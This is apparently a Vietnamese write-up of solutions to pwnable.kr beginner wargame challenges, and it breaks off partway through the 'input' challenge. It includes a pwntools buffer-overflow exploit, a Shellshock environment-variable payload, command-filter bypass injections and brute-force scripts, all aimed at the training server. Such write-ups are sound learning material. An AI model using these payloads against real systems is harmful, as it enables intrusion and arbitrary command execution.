---
title: '[Writeup] Try hard PWNABLE.kr'
date: 2025-03-09 04:12:48
tags:
  - PWN
  - Writeups

---

# [Writeup] Try hard PWNABLE.kr

## Things I Want to Tell Myself

...

## [Toddler's Bottle]

### FD

```txt
Start day: 9/3/2025
End day: 9/3/2025
Evaluate: Beginner
```

```txt
Information: 1 point

Mommy! what is a file descriptor in Linux?

* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:
https://youtu.be/971eZhMHQQw

ssh fd@pwnable.kr -p2222 (pw:guest)
```

Server có 3 file
![alt img](/img/2025/pwnable.kr/image.png)

Bài này đơn giản là sẽ lấy tham số truyền vào => Chuyển đổi thành số => Đem trừ cho 0x1234 => Đưa thành [file descriptor](https://www.geeksforgeeks.org/input-output-system-calls-c-create-open-close-read-write/) của hàm read để ghi giá trị vào biến buf => So sánh buf với chuỗi "LETMEWIN" => In ra flag

=> fd của STDIN là 0 nên giá trị cần đưa vào là 0x1234 (ở dec là 4660)

```bash
fd@pwnable:~$ echo "LETMEWIN" | ./fd 4660
```

### collision

```txt
Start day: 9/3/2025
End day: 9/3/2025
Evaluate: Beginner
```

```txt
Information: 3 point

Daddy told me about cool MD5 hash collision today.
I wanna do something like that too!

ssh col@pwnable.kr -p2222 (pw:guest)
```

![alt img](/img/2025/pwnable.kr/image-1.png)

Challenge này yêu cầu một tham số truyền vào có độ dài 20 bytes để làm passcode => Được đem đi xử lý ở hàm check_password => Sau đo so sánh với hashcode = 0x21DD09EC => Nếu khớp thì in ra flag.

=> Trong hàm check_password, có rất nhiều cách để có thể trả về giá trị bằng với hashcode => Tạo một script generate giá trị hợp lệ

```python
import struct

hashcode = 0x21DD09EC

part = hashcode // 5
remainder = hashcode - part * 5 
passcode = (struct.pack("<I", part) * 4) + struct.pack("<I", part + remainder)

print(passcode) 
```

```bash
b'\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06'
```

```bash
col@pwnable:~$ ./col $(python2 -c "print '\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06'")
```

### bof

```txt
Start day: 9/3/2025
End day: 9/3/2025
Evaluate: Easy
```

```txt
Information: 5 point

Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```

Source code:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

Challenge này yêu cầu dùng lỗi Buffer Overflow ở hàm **gets** để có thể ghi đè thay đổi giá trị của tham số **key** thành 0xcafebabe.

```txt
+----------------+  
| key            |
+----------------+  <- ESP (Stack Pointer)
| Return Addr    |  
+----------------+
| Saved EBP      |  
+----------------+
| Canary         |  
+----------------+
| overflowme     |  
|                |  
|                |  
|                |  
+----------------+
```

Bài này có canary, tuy nhiên chỉ cần ghi đè key và thực thi được hàm **system("/bin/sh")** để lấy shell thì việc check canary sẽ không bị ảnh hưởng.

```bash
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```

Để đè được key thì cần padding: 32 (overflowme) + 4 (canary) + 4 (save ebp) + 4 (ret) + 8 (padding, tham số đầu tiên sẽ là ebp + 8) = 52 bytes

```python
from pwn import *

exe = ELF("./bof", checksec=False)
# p = process(exe.path)
p = remote("pwnable.kr", 9000)

payload = b"A" * 52
payload += p32(0xcafebabe)

p.sendline(payload)

p.interactive()
```

### flag

```txt
Start day: 9/3/2025
End day: 9/3/2025
Evaluate: Beginner
```

```txt
Information: 7 point

Papa brought me a packed present! let's open it.

Download : http://pwnable.kr/bin/flag

This is reversing task. all you need is binary
```

Bài này là một bài reverse cơ bản, mở nó lên bằng IDA thì thấy không có gì => Dùng DIE để mở lên thì thấy chương trình bị pack bởi UPX

![alt img](/img/2025/pwnable.kr/image-2.png)

Unpack và mở lên lại bằng IDA và lấy được flag

![alt img](/img/2025/pwnable.kr/image-3.png)

### mistake

```txt
Start day: 3/9/2025
End day: 3/9/2025
Evaluate: Beginner
```

```txt
Information: 1 point

We all make mistakes, let's move on.
(don't take this too seriously, no fancy hacking skill is required at all)

This task is based on real event
Thanks to dhmonkey

hint : operator priority

ssh mistake@pwnable.kr -p2222 (pw:guest)
```

Challenge này cung cấp 4 file: flag, mistake, mistake.c và password

Source code

```bash
mistake@pwnable:~$ ls
flag  mistake  mistake.c  password
mistake@pwnable:~$ cat mistake.c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
        int i;
        for(i=0; i<len; i++){
                s[i] ^= XORKEY;
        }
}

int main(int argc, char* argv[]){

        int fd;
        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
                printf("can't open password %d\n", fd);
                return 0;
        }

        printf("do not bruteforce...\n");
        sleep(time(0)%20);

        char pw_buf[PW_LEN+1];
        int len;
        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
                printf("read error\n");
                close(fd);
                return 0;
        }

        char pw_buf2[PW_LEN+1];
        printf("input password : ");
        scanf("%10s", pw_buf2);

        // xor your input
        xor(pw_buf2, 10);

        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
                printf("Password OK\n");
                system("/bin/cat flag\n");
        }
        else{
                printf("Wrong Password\n");
        }

        close(fd);
        return 0;
}

mistake@pwnable:~$
```

Ở bài này, chương trình sẽ đọc vào 10 ký tự từ file password. Sau đó, nó yêu cầu người dùng nhập vào 10 ký tự rồi đem đi xor từng ký tự nhập vào với 1 => Đem đi so sánh với password được lấy từ file password => Nếu khớp thì sẽ in ra flag.

=> Để khai thác thì ghi đè **pw_buf2** thành giá trị sau khi xor của **pw_buf1** (Lỗi BOF ở hàm **scanf**)
=> Ví dụ: `pw_buf1 = 'aaaaaaaaaa'` thì `pw_buf2 = '``````````'`.

```bash
mistake@pwnable:~$ ./mistake
do not bruteforce...
``````````aaaaaaaaaa
input password : Password OK
Mommy, the operator priority always confuses me :(
mistake@pwnable:~$
```

### shellshock

```txt
Start day: 3/9/2025
End day: 3/9/2025
Evaluate: Beginner
```

```txt
Information: 1 point

Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)


ssh shellshock@pwnable.kr -p2222 (pw:guest)
```

Challenge gồm 4 file: bash, flag, shellshork, shellshork.c

![alt img](/img/2025/pwnable.kr/image-4.png)

- Với bài này, mình chưa biết shellshork là gì, nên sẽ đi tìm hiểu trước.


> Shellshock là một lỗ hổng bảo mật nghiêm trọng được phát hiện vào năm 2014 trong GNU Bash, cho phép kẻ tấn công thực thi mã tùy ý trên hệ thống.

> Lỗ hổng xảy ra khi Bash xử lý các biến môi trường (environment variables). Nếu một biến môi trường chứa một hàm (function) và tiếp tục có lệnh ngoài sau đó, Bash sẽ thực thi lệnh đó.

> Ví dụ:

`env var='() {(a)=>\' bash -c "echo Hacked"; echo "Hello"`
> Giải thích: 
> env var='() {(a)=>\' bash -c "echo Hacked"': Tạo một biến môi trường x chứa một function trống.
echo "Hello": Chạy một lệnh bash, nhưng do lỗi Shellshock, Bash sẽ thực thi echo HACKED trước cả khi chạy echo Hello.

Dựa vào những gì mình tìm hiểu được về **shellshork** thì bài này cần phải tạo một biến ENV chứa lỗi shellshork in ra flag => Run binary => Get flag

```bash
shellshock@pwnable:~$ env x='() { :;}; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)
shellshock@pwnable:~$
```

### blackjack

```
Start day: 9/3/2025
End day: 9/3/2025
Evaluate: Beginner
```

```txt
Information: 1 point

Hey! check out this C implementation of blackjack game!
I found it online
* http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html

I like to give my flags to millionares.
how much money you got?


Running at : nc pwnable.kr 9009
```

Đọc qua mã nguồn thì nhận thấy bài này mắc phải lỗi là không kiểm tra số tiền đặt cược của người chơi => Người chơi bet tiền âm < 0 và thua cuộc => Tiền của người chơi tăng lên thay vì giảm xuống.

=> Bet 1.000.000 rồi cứ bốc tiếp tới khi thua => Bú flag

(Lần đầu tiên trong đời chơi Xì dách mà 20 điểm vẫn không được dằn @^@)

### lotto

```
Start day: 9/3/2025
End day: 9/3/2025
Evaluate: Beginner
```

```
Information: 2 point

Mommy! I made a lotto program for my homework.
do you want to play?


ssh lotto@pwnable.kr -p2222 (pw:guest)
```

Challenge này được cấp 3 file: flag, lotto, lotto.c

```bash
lotto@pwnable:~$ ls
flag  lotto  lotto.c
lotto@pwnable:~$ cat lotto.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){

        int i;
        printf("Submit your 6 lotto bytes : ");
        fflush(stdout);

        int r;
        r = read(0, submit, 6);

        printf("Lotto Start!\n");
        //sleep(1);

        // generate lotto numbers
        int fd = open("/dev/urandom", O_RDONLY);
        if(fd==-1){
                printf("error. tell admin\n");
                exit(-1);
        }
        unsigned char lotto[6];
        if(read(fd, lotto, 6) != 6){
                printf("error2. tell admin\n");
                exit(-1);
        }
        for(i=0; i<6; i++){
                lotto[i] = (lotto[i] % 45) + 1;         // 1 ~ 45
        }
        close(fd);

        // calculate lotto score
        int match = 0, j = 0;
        for(i=0; i<6; i++){
                for(j=0; j<6; j++){
                        if(lotto[i] == submit[j]){
                                match++;
                        }
                }
        }

        // win!
        if(match == 6){
                system("/bin/cat flag");
        }
        else{
                printf("bad luck...\n");
        }

}

void help(){
        printf("- nLotto Rule -\n");
        printf("nlotto is consisted with 6 random natural numbers less than 46\n");
        printf("your goal is to match lotto numbers as many as you can\n");
        printf("if you win lottery for *1st place*, you will get reward\n");
        printf("for more details, follow the link below\n");
        printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
        printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

        // menu
        unsigned int menu;

        while(1){

                printf("- Select Menu -\n");
                printf("1. Play Lotto\n");
                printf("2. Help\n");
                printf("3. Exit\n");

                scanf("%d", &menu);

                switch(menu){
                        case 1:
                                play();
                                break;
                        case 2:
                                help();
                                break;
                        case 3:
                                printf("bye\n");
                                return 0;
                        default:
                                printf("invalid menu\n");
                                break;
                }
        }
        return 0;
}

lotto@pwnable:~$
```

Binary này dùng để so sánh 6 bytes người dùng nhập vào với 6 bytes được random ngẫu nhiên nằm trong khoảng (1-45).
Tuy nhiên lỗi là ở đoạn code:

```c
for(i=0; i<6; i++){
        for(j=0; j<6; j++){
                if(lotto[i] == submit[j]){
                        match++;
                }
        }
}
```

Chỉ cần nhập một chuỗi ký tự có cả 6 ký tự như nhau (Mã ascii từ 1 - 45) => Chỉ cần 1 ký tự random trùng với ký tự được nhập => Get flag

```python
from pwn import *

sh = ssh('lotto', 'pwnable.kr', password='guest', port=2222)
p = sh.process('./lotto')

for i in range(45):
    p.sendlineafter(b"Exit\n", b"1")
    p.sendlineafter(b"bytes : ", b'!!!!!!')
    p.recvline()
    data = p.recvline()
    if b"bad luck..." not in data:
        print(data)
        break
```

```bash
└─$ python3 sol.py 
[+] Connecting to pwnable.kr on port 2222: Done
[*] lotto@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.179
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on pwnable.kr: pid 415165
[!] ASLR is disabled for '/home/lotto/lotto'!
b'sorry mom... I FORGOT to check duplicate numbers... :(\n'
```

### cmd1

```
Start day: 9/3/2025
End day: 9/3/2025
Evaluate: Beginner
```

```
Information: 1 point

Mommy! what is PATH environment in Linux?

ssh cmd1@pwnable.kr -p2222 (pw:guest)
```

Source code

```bash
cmd1@pwnable:~$ ls
cmd1  cmd1.c  flag
cmd1@pwnable:~$ cat cmd1.c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
}

cmd1@pwnable:~$
```

Bài này lấy tham số truyền vào đem đi check filter với các giá trị ['flag', 'sh', 'tmp'], nếu trùng thì sẽ kết thúc chương trình. Đồng thời khi bắt đầu chạy thì ghi giá trị của biến môi trường `PATH` thành `/thankyouverymuch` khiến cho việc sử dụng các lệnh thông qua relative path không được.

=> Dùng absolute path + bypass filter

Payload: `/bin/cat fla?`

```bash
cmd1@pwnable:~$ ./cmd1 "/bin/cat fla?"
mommy now I get what PATH environment is for :)
cmd1@pwnable:~$
```

### random

```
Start day: 9/3/2025
End day: 9/3/2025
Evaluate: Beginner
```

```txt
Information: 1 point

Daddy, teach me how to use random value in programming!

ssh random@pwnable.kr -p2222 (pw:guest)
```

Source code

```bash
random@pwnable:~$ ls
flag  random  random.c
random@pwnable:~$ cat random.c
#include <stdio.h>

int main(){
        unsigned int random;
        random = rand();        // random value!

        unsigned int key=0;
        scanf("%d", &key);

        if( (key ^ random) == 0xdeadbeef ){
                printf("Good!\n");
                system("/bin/cat flag");
                return 0;
        }

        printf("Wrong, maybe you should try 2^32 cases.\n");
        return 0;
}

random@pwnable:~$
```

Ở challenge này, `random = rand();` được dùng không đúng cách khiến cho `rand()` luôn trả về một giá trị duy nhất.

=> Debug và lấy được giá trị random này là **0x6b8b4567**
=> key cần nhập là 0x6b8b4567 ^ 0xdeadbeef = 3039230856

```bash
0x0000000000400606 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────
*RAX  0x6b8b4567
 RBX  0x7fffffffd988 —▸ 0x7fffffffdc5f ◂— '/mnt/d/Security/PeginWN/Challenge/pwnalbekr/random/random'
*RCX  0x7ffff7fa7028 (randtbl+8) ◂— 0x6774a4cd16a5bce3
*RDX  0
*RDI  0x7ffff7fa76a0 (unsafe_state) —▸ 0x7ffff7fa7034 (randtbl+20) ◂— 0x61048c054e508aaa
*RSI  0x7fffffffd834 ◂— 0x1171ea006b8b4567
*R8   0x7ffff7fa7034 (randtbl+20) ◂— 0x61048c054e508aaa
*R9   0x7ffff7fa70a0 (pa_next_type) ◂— 8
 R10  3
*R11  0x7ffff7e04430 (rand) ◂— sub rsp, 8
 R12  0
 R13  0x7fffffffd998 —▸ 0x7fffffffdc99 ◂— 'SHELL=/bin/bash'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 R15  0
 RBP  0x7fffffffd870 ◂— 1
 RSP  0x7fffffffd860 ◂— 0
*RIP  0x400606 (main+18) ◂— mov dword ptr [rbp - 4], eax
──────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────
   0x400601 <main+13>    call   rand@plt                    <rand@plt>
 
 ► 0x400606 <main+18>    mov    dword ptr [rbp - 4], eax     [0x7fffffffd86c] <= 0x6b8b4567
   0x400609 <main+21>    mov    dword ptr [rbp - 8], 0       [0x7fffffffd868] <= 0
   0x400610 <main+28>    mov    eax, 0x400760                EAX => 0x400760 ◂— and eax, 0x6f470064 /* '%d' */
   0x400615 <main+33>    lea    rdx, [rbp - 8]               RDX => 0x7fffffffd868 ◂— 0x6b8b456700000000
   0x400619 <main+37>    mov    rsi, rdx                     RSI => 0x7fffffffd868 ◂— 0x6b8b456700000000
   0x40061c <main+40>    mov    rdi, rax                     RDI => 0x400760 ◂— and eax, 0x6f470064 /* '%d' */
   0x40061f <main+43>    mov    eax, 0                       EAX => 0
   0x400624 <main+48>    call   __isoc99_scanf@plt          <__isoc99_scanf@plt>
 
   0x400629 <main+53>    mov    eax, dword ptr [rbp - 8]
   0x40062c <main+56>    xor    eax, dword ptr [rbp - 4]
───────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd860 ◂— 0
01:0008│-008 0x7fffffffd868 —▸ 0x7fffffffd900 —▸ 0x7fffffffd998 —▸ 0x7fffffffdc99 ◂— 'SHELL=/bin/bash'
02:0010│ rbp 0x7fffffffd870 ◂— 1
03:0018│+008 0x7fffffffd878 —▸ 0x7ffff7de9d68 (__libc_start_call_main+120) ◂— mov edi, eax
04:0020│+010 0x7fffffffd880 —▸ 0x7fffffffd970 —▸ 0x7fffffffd978 ◂— 0x38 /* '8' */
05:0028│+018 0x7fffffffd888 —▸ 0x4005f4 (main) ◂— push rbp
06:0030│+020 0x7fffffffd890 ◂— 0x100400040 /* '@' */
07:0038│+028 0x7fffffffd898 —▸ 0x7fffffffd988 —▸ 0x7fffffffdc5f ◂— '/mnt/d/Security/PeginWN/Challenge/pwnalbekr/random/random'
─────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────
 ► 0         0x400606 main+18
   1   0x7ffff7de9d68 __libc_start_call_main+120
   2   0x7ffff7de9e25 __libc_start_main+133
   3         0x400539 _start+41
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

**POC**

```bash
random@pwnable:~$ ./random
3039230856
Good!
Mommy, I thought libc random is unpredictable...
random@pwnable:~$
```

### leg (2 pt)

```
Start day: 9/3/2025
End day: 9/3/2025
Evaluate: Easy
```

```txt
Information: 2 point

Daddy told me I should study arm.
But I prefer to study my leg!

Download : http://pwnable.kr/bin/leg.c
Download : http://pwnable.kr/bin/leg.asm

ssh leg@pwnable.kr -p2222 (pw:guest)
```

Source code

**leg.c**

```c
#include <stdio.h>
#include <fcntl.h>
int key1(){
	asm("mov r3, pc\n");
}
int key2(){
	asm(
	"push	{r6}\n"
	"add	r6, pc, $1\n"
	"bx	r6\n"
	".code   16\n"
	"mov	r3, pc\n"
	"add	r3, $0x4\n"
	"push	{r3}\n"
	"pop	{pc}\n"
	".code	32\n"
	"pop	{r6}\n"
	);
}
int key3(){
	asm("mov r3, lr\n");
}
int main(){
	int key=0;
	printf("Daddy has very strong arm! : ");
	scanf("%d", &key);
	if( (key1()+key2()+key3()) == key ){
		printf("Congratz!\n");
		int fd = open("flag", O_RDONLY);
		char buf[100];
		int r = read(fd, buf, 100);
		write(0, buf, r);
	}
	else{
		printf("I have strong leg :P\n");
	}
	return 0;
}
```

**leg.asm**
```asm
(gdb) disass main
Dump of assembler code for function main:
   0x00008d3c <+0>:	push	{r4, r11, lr}
   0x00008d40 <+4>:	add	r11, sp, #8
   0x00008d44 <+8>:	sub	sp, sp, #12
   0x00008d48 <+12>:	mov	r3, #0
   0x00008d4c <+16>:	str	r3, [r11, #-16]
   0x00008d50 <+20>:	ldr	r0, [pc, #104]	; 0x8dc0 <main+132>
   0x00008d54 <+24>:	bl	0xfb6c <printf>
   0x00008d58 <+28>:	sub	r3, r11, #16
   0x00008d5c <+32>:	ldr	r0, [pc, #96]	; 0x8dc4 <main+136>
   0x00008d60 <+36>:	mov	r1, r3
   0x00008d64 <+40>:	bl	0xfbd8 <__isoc99_scanf>
   0x00008d68 <+44>:	bl	0x8cd4 <key1>
   0x00008d6c <+48>:	mov	r4, r0
   0x00008d70 <+52>:	bl	0x8cf0 <key2>
   0x00008d74 <+56>:	mov	r3, r0
   0x00008d78 <+60>:	add	r4, r4, r3
   0x00008d7c <+64>:	bl	0x8d20 <key3>
   0x00008d80 <+68>:	mov	r3, r0
   0x00008d84 <+72>:	add	r2, r4, r3
   0x00008d88 <+76>:	ldr	r3, [r11, #-16]
   0x00008d8c <+80>:	cmp	r2, r3
   0x00008d90 <+84>:	bne	0x8da8 <main+108>
   0x00008d94 <+88>:	ldr	r0, [pc, #44]	; 0x8dc8 <main+140>
   0x00008d98 <+92>:	bl	0x1050c <puts>
   0x00008d9c <+96>:	ldr	r0, [pc, #40]	; 0x8dcc <main+144>
   0x00008da0 <+100>:	bl	0xf89c <system>
   0x00008da4 <+104>:	b	0x8db0 <main+116>
   0x00008da8 <+108>:	ldr	r0, [pc, #32]	; 0x8dd0 <main+148>
   0x00008dac <+112>:	bl	0x1050c <puts>
   0x00008db0 <+116>:	mov	r3, #0
   0x00008db4 <+120>:	mov	r0, r3
   0x00008db8 <+124>:	sub	sp, r11, #8
   0x00008dbc <+128>:	pop	{r4, r11, pc}
   0x00008dc0 <+132>:	andeq	r10, r6, r12, lsl #9
   0x00008dc4 <+136>:	andeq	r10, r6, r12, lsr #9
   0x00008dc8 <+140>:			; <UNDEFINED> instruction: 0x0006a4b0
   0x00008dcc <+144>:			; <UNDEFINED> instruction: 0x0006a4bc
   0x00008dd0 <+148>:	andeq	r10, r6, r4, asr #9
End of assembler dump.
(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cd8 <+4>:	add	r11, sp, #0
   0x00008cdc <+8>:	mov	r3, pc
   0x00008ce0 <+12>:	mov	r0, r3
   0x00008ce4 <+16>:	sub	sp, r11, #0
   0x00008ce8 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008cec <+24>:	bx	lr
End of assembler dump.
(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>:	add	r11, sp, #0
   0x00008cf8 <+8>:	push	{r6}		; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:	add	r6, pc, #1
   0x00008d00 <+16>:	bx	r6
   0x00008d04 <+20>:	mov	r3, pc
   0x00008d06 <+22>:	adds	r3, #4
   0x00008d08 <+24>:	push	{r3}
   0x00008d0a <+26>:	pop	{pc}
   0x00008d0c <+28>:	pop	{r6}		; (ldr r6, [sp], #4)
   0x00008d10 <+32>:	mov	r0, r3
   0x00008d14 <+36>:	sub	sp, r11, #0
   0x00008d18 <+40>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d1c <+44>:	bx	lr
End of assembler dump.
(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008d24 <+4>:	add	r11, sp, #0
   0x00008d28 <+8>:	mov	r3, lr
   0x00008d2c <+12>:	mov	r0, r3
   0x00008d30 <+16>:	sub	sp, r11, #0
   0x00008d34 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d38 <+24>:	bx	lr
End of assembler dump.
(gdb)
```

Nhiệm vụ của bài này là phải đọc hiểu code để tìm ra được giá trị của `key1() + key2() + key3()`

- Function **Key1**: Tại 0x00008cdc, chương trình gán giá trị của **pc** (Thanh ghi lệnh trong kiến trúc ARM) vào r3 -> r0 => Giá trị return 
    - Ở đây **pc** sẽ có giá trị là **0x00008cdc + 8** vì trong ARM có cơ chế pipeline 3 giai đoạn (fetch, decode, execute) => ***0x00008ce4***
- Function **Key2**: Tại 0x00008d04, chương trình làm tương tự và ngay sau đó cộng thêm 4.
    - Tuy nhiên, tại lệnh `0x00008cfc <+12>:	add	r6, pc, #1` và `0x00008d00 <+16>:	bx	r6`, chương trình đã nhảy đến địa chỉ lẻ (+1) => Chuyển sang thumb mode => Các lệnh giảm đi 1 nữa giá trị
    - Điều này khiến pc nhận giá trị: 0x00008d04 + 4 => Sau đó tăng lên 4 nữa => 0x00008d04 + 4 + 4 = ***0x8d0c***
- Function **Key3**: Ở hàm này, giá trị trả về sẽ là địa chỉ trở về của câu lệnh => Tức là địa chỉ tiếp theo của hàm main ngay sau khi call hàm **key3** => ***0x00008d80*** (<+68>:	mov	r3, r0)

=> Giá trị cần nhập là: 0x00008ce4 + 0x8d0c + 0x00008d80 = 108400

**POC**

```bash
/ $ ./leg
Daddy has very strong arm! : 108400
Congratz!
My daddy has a lot of ARMv5te muscle!
```

### blukat (3 pt)

```
Start day: 9/3/2025
End day: 9/3/2025
Evaluate: F*ck
```

```txt
Information: 3 point

Sometimes, pwnable is strange...
hint: if this challenge is hard, you are a skilled player.

ssh blukat@pwnable.kr -p2222 (pw: guest)
```

Lừa của lừa @@

Source code

```bash
blukat@pwnable:~$ ls
blukat  blukat.c  password
blukat@pwnable:~$ cat blukat.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
char flag[100];
char password[100];
char* key = "3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+";
void calc_flag(char* s){
        int i;
        for(i=0; i<strlen(s); i++){
                flag[i] = s[i] ^ key[i];
        }
        printf("%s\n", flag);
}
int main(){
        FILE* fp = fopen("/home/blukat/password", "r");
        fgets(password, 100, fp);
        char buf[100];
        printf("guess the password!\n");
        fgets(buf, 128, stdin);
        if(!strcmp(password, buf)){
                printf("congrats! here is your flag: ");
                calc_flag(password);
        }
        else{
                printf("wrong guess!\n");
                exit(0);
        }
        return 0;
}

blukat@pwnable:~$
```

Bài này canary bật hết nên ý tưởng lúc đầu là ghi đè địa chỉ trở về để in ra flag bị dập tắt ngay @@

Loay hoay mãi mình mới nhận ra nội dung của file password mình có quyền đọc nó. Nhưng ...

```bash
blukat@pwnable:~$ cat password
cat: password: Permission denied
blukat@pwnable:~$
```

Nhìn nó kì kì :>

```sh
blukat@pwnable:~$ ls -l password
-rw-r----- 1 root blukat_pwn 33 Jan  6  2017 password
blukat@pwnable:~$ id
uid=1104(blukat) gid=1104(blukat) groups=1104(blukat),1105(blukat_pwn)
blukat@pwnable:~$
```

=> Nội dung của file password là: `cat: password: Permission denied`

Đ*m 

### cmd2 (9 pt)

```
Start day: 10/3/2025
End day: 10/3/2025
Evaluate: Easy
```

```txt
Information: 9 point

Daddy bought me a system command shell.
but he put some filters to prevent me from playing with it without his permission...
but I wanna play anytime I want!

ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)
```

Source code

```bash
cmd2@pwnable:~$ ls
cmd2  cmd2.c  flag
cmd2@pwnable:~$ cat cmd2.c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}

cmd2@pwnable:~$
```

Ở bài này, các biến môi trường đều đã bị gỡ và dấu "/" cũng đã bị filter nên không thể dùng lại cách của bài **cmd1**.

=> Tuy nhiên ở đây, vẫn có thể truyền bash script vào để hàm system thực hiện => Viết script nhận giá trị nhập vào, sau đó thực thi nó.

**Script**

```bash
read cmd
echo $cmd
```

=> Biến nó thành one line: `$(read cmd; echo $cmd)`

**POC**

```bash
cmd2@pwnable:~$ ./cmd2 '$(read cmd; echo $cmd)'
$(read cmd; echo $cmd)
/bin/ls
cmd2  cmd2.c  flag
cmd2@pwnable:~$ ./cmd2 '$(read cmd; echo $cmd)'
$(read cmd; echo $cmd)
/bin/cat flag
FuN_w1th_5h3ll_v4riabl3s_haha
cmd2@pwnable:~$
```

### input (4 pt)

```
Start day: 11/3/2025
End day: 11/3/2025
Evaluate: Beginner
```

```txt
Information: 4 points

Mom? how can I pass my input to a computer program?

ssh input2@pwnable.kr -p2222 (pw:guest)
```

Source code

```bash
input2@pwnable:~$ ls
flag  input  input.c
input2@pwnable:~$ cat input.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
        printf("Welcome to pwnable.kr\n");
        printf("Let's see if you know how to give input to program\n");
        printf("Just give me correct inputs then you will get the flag :)\n");

        // argv
        if(argc != 100) return 0;
        if(strcmp(argv['A'],"\x00")) return 0;
        if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
        printf("Stage 1 clear!\n");

        // stdio
        char buf[4];
        read(0, buf, 4);
        if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
        read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
        printf("Stage 2 clear!\n");

        // env
        if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
        printf("Stage 3 clear!\n");

        // file
        FILE* fp = fopen("\x0a", "r");
        if(!fp) return 0;
        if( fread(buf, 4, 1, fp)!=1 ) return 0;
        if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
        fclose(fp);
        printf("Stage 4 clear!\n");

        // network
        int sd, cd;
        struct sockaddr_in saddr, caddr;
        sd = socket(AF_INET, SOCK_STREAM, 0);
        if(sd == -1){
                printf("socket error, tell admin\n");
                return 0;
        }
        saddr.sin_family = AF_INET;
        saddr.sin_addr.s_addr = INADDR_ANY;
        saddr.sin_port = htons( atoi(argv['C']) );
        if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
                printf("bind error, use another port\n");
                return 1;
        }
        listen(sd, 1);
        int c = sizeof(struct sockaddr_in);
